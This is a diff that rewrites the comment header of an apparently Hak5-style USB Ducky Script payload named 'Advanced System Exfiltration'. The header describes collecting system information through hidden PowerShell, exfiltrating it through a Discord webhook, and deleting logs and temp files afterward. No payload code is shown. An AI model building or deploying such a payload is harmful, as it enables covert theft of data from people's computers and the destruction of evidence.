@@ -1,11 +1,7 @@
 REM Title: A.S.E - Advanced_System_Exfiltration
 REM Author: LulzAnarchyAnon
-REM Description: This slow, and steady staged payload takes it's time and gleans detailed system information using 
-REM powershell, Ducky script and notepad. First a hidden powershell is opened in stages, and payloads are deployed to 
-REM collect the target computers system information, Then a notepad.txt file named loot is created with all 
-REM the gleaned information, and hidden in the Public Users folder C:\Users\Public\loot.txt The loot is then 
-REM exfiltrated using a Discord webhook. In the final stage of the payload the loot.txt file, the recycling bin 
-REM contents, the temp folder contents and powershell history are all deleted. 
+REM Description: This payload gleans detailed system information from the target system using powershell, ducky and notepad. First a hidden powershell is opened, and a payload is deployed to collect the target computers system information. Then a notepad file named loot is created with all the gleaned information, and hidden in the public Users folder C:\Users\Public\loot.txt of the target system. The loot is then 
+exfiltrated using a Discord webhook. In the final stage of the payload the loot.txt file, the recycling bin contents, the temp folder contents and powershell history are all deleted. 
 REM Target: Windows 10 & 11
 REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
 REM Version: 3.0
